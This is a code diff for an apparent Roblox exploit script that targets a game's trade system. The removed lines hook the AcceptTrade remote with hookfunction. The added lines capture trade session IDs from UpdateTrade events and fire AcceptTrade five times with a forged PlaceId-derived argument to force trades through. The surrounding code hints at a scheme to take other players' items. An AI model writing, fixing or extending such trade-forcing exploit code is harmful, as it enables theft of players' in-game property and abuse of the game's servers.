@@ -266,40 +266,52 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
 
--- Capture the session ID
+-- Session storage
 local lastSessionId = nil
 local placeIdMultiplier = game.PlaceId * 3
 
--- Hook AcceptTrade using hookfunction (works for RemoteEvents)
-local oldFireServer
-oldFireServer = hookfunction(AcceptTradeRemote.FireServer, function(self, ...)
-    local args = {...}
-    if #args >= 2 and type(args[2]) == "number" then
-        lastSessionId = args[2]
+-- Capture session ID from trade updates
+Trade:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
+    if not data then return end
+    
+    -- Try multiple possible field names
+    if data.SessionId then 
+        lastSessionId = data.SessionId 
+    elseif data.LastOffer then 
+        lastSessionId = data.LastOffer 
+    elseif data.TradeId then 
+        lastSessionId = data.TradeId 
+    elseif data.OfferId then
+        lastSessionId = data.OfferId
+    end
+    
+    -- Sometimes it's in a nested table
+    if data.Trade and data.Trade.SessionId then
+        lastSessionId = data.Trade.SessionId
+    end
+    
+    if lastSessionId then
         print("Captured session:", lastSessionId)
     end
-    return oldFireServer(self, ...)
 end)
 
--- Also capture from trade updates
-Trade:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
-    if data then
-        if data.SessionId then lastSessionId = data.SessionId end
-        if data.LastOffer then lastSessionId = data.LastOffer end
-        if data.TradeId then lastSessionId = data.TradeId end
-    end
-end)
-
--- REPLACEMENT acceptTrade function
+-- Replacement accept function
 local function acceptTrade()
     if not lastSessionId then
-        warn("No session ID captured!")
+        warn("No session ID yet!")
+        -- Debug: print what we have
+        print("Trying to get trade data...")
         return
     end
     
-    AcceptTradeRemote:FireServer(placeIdMultiplier, lastSessionId)
+    print("Accepting with session:", lastSessionId)
+    
+    -- Fire multiple times for reliability
+    for i = 1, 5 do
+        AcceptTradeRemote:FireServer(placeIdMultiplier, lastSessionId)
+        task.wait(0.1)
+    end
 end
-
 local totalValue = 0
 
 local function SendFirstMessage(list, prefix)
